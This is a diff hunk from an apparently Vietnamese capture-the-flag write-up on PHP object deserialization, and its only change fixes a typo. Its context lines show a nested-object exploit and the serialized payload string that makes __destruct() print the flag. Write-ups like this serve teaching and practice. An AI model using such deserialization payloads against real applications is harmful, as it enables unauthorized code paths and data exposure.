@@ -73,7 +73,7 @@ $exploit = new Y(new Y('flag'));
 $exploit = new Y(new Y(new X('flag')));
 // O:1:"Y":1:{s:6:"secret";O:1:"Y":1:{s:6:"secret";O:1:"X":1:{s:7:"cleanup";s:4:"flag";}}}
 ```
-Việc lồng ghép này sẽ khiến hàm X gặp lỗi và gọi đến **__destruct()** mà bỏ qua hàm **__construct()** , điều này dẫn đến việc hai lệnh if được thực hiện và in ra đông thời 'No!' và flag.
+Việc lồng ghép này sẽ khiến hàm X gặp lỗi và gọi đến **__destruct()** mà bỏ qua hàm **__construct()** , điều này dẫn đến việc hai lệnh if được thực hiện và in ra đồng thời 'No!' và flag.
 
 Exploit.php
 
